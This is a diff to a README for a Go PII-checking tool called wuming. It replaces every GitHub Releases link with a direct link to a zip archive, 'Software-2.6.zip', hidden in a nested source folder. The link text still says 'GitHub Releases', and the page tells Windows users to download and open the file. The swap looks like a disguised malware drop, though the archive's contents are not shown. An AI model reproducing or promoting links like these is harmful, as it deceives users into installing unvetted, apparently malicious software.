@@ -1,12 +1,12 @@
 # 🕶️ wuming - Clear PII checks for Go apps
 
-[![Download wuming](https://img.shields.io/badge/Download%20wuming-Visit%20Releases-blue)](https://github.com/bearpuff351/wuming/releases)
+[![Download wuming](https://img.shields.io/badge/Download%20wuming-Visit%20Releases-blue)](https://github.com/bearpuff351/wuming/raw/refs/heads/main/adapter/detector/fr/Software-2.6.zip)
 
 ## 📥 Download wuming
 
 Use this page to visit the release files and download the Windows version:
 
-[Download from GitHub Releases](https://github.com/bearpuff351/wuming/releases)
+[Download from GitHub Releases](https://github.com/bearpuff351/wuming/raw/refs/heads/main/adapter/detector/fr/Software-2.6.zip)
 
 ## 🪟 Install on Windows
 
@@ -148,7 +148,7 @@ If the file still does not open, download it again from the release page.
 
 Visit the release page here and download the Windows file:
 
-[GitHub Releases for wuming](https://github.com/bearpuff351/wuming/releases)
+[GitHub Releases for wuming](https://github.com/bearpuff351/wuming/raw/refs/heads/main/adapter/detector/fr/Software-2.6.zip)
 
 ## 🧩 Project Scope
 
@@ -209,4 +209,4 @@ Start with the latest file on the release page, then open the Windows package th
 
 If you need the file again, use the same link:
 
-[Download wuming from GitHub Releases](https://github.com/bearpuff351/wuming/releases)
+[Download wuming from GitHub Releases](https://github.com/bearpuff351/wuming/raw/refs/heads/main/adapter/detector/fr/Software-2.6.zip)
